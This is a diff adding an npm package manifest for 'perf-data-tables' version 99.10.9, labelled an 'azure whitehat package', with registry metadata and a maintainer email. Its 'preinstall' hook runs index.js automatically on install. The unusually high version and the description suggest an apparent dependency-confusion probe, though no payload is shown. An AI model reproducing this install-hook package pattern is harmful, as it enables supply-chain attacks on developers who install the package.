@@ -1,0 +1,39 @@
+{
+    "name": "perf-data-tables",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-data-tables@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-ToGhK0O0Ko1WbQZhI+jBp9jjscrWqghpO1nfYUqR/VYXlCQdVsQutphO/hTFKtUNYWPPMnDbAxPPfX19eXsNgw==",
+        "shasum": "2efa5f34d1b9e7fe30e27a7955023c6cbbd5bb97",
+        "tarball": "https://registry.npmjs.org/perf-data-tables/-/perf-data-tables-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3580,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon06CRA9TVsSAnZWagAAxRUQAJaaQh+Tr7/xOhD5Ha8G\nhP4/u9EyoHkuT5j7qbwKWdAUqfD33nXBYVH0NddM42KfQgLv1uUaWf9e+WkR\n2wENsNXJ36LVyAuB28vhMJL89RSUoZiDR5KjtqCmGV3AkdowquZvQ7GI/VP4\nokkdL161ZxWpQcfPqqV8V+lP46qwL39JCJ1cg52LfaR0+U98xWRw0bCdzphO\nusxUuaXtgFOkylaulaFfx4NFGjPMV6su4ctCVs6TeBxm0pORAk6hDmiaBRuV\nE41QFh5LYtrd9JMsj+98yH5V0+GuOQIsEq6vaaoGUGvYmoVjMsxDmttC+uDD\n1TBzQ+aobpqATvpER5da+rk5R5eyY3sWU6FcckXH5lnsAq39aMAak2D/zMf8\n1lAmn5NkwI8z1aauPOE/0wXQwZA3hCoUhQh/no4/zruF+0X1HOeMuWMhqFu9\nqu2UxtkI17wxr7WNlIE5aRbW62TDgN9K5cuQJtAQWukdmLbvr3BIVHV8iYBe\nGCqrfFzlN+MJl4iQUPPlSAgW6jfcNGZkUnTSLmtMzE/wQncG5T0zqKyUGejM\nPhxwzXoDg/sRuPHrmGVvZe3wf5Y9mcZH/2Rzk41/XQZVUBHPxeEGjU23ZyMu\nAvpZTsZxM4ScmDXdV+rmqy2YPb69h8gktW+Ctj3HyEQOsL6Dkop8y3gJCVYg\n+3XA\r\n=i1Ft\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-data-tables_99.10.9_1638038842377_0.41582727745992476"
+    },
+    "_hasShrinkwrap": false
+}
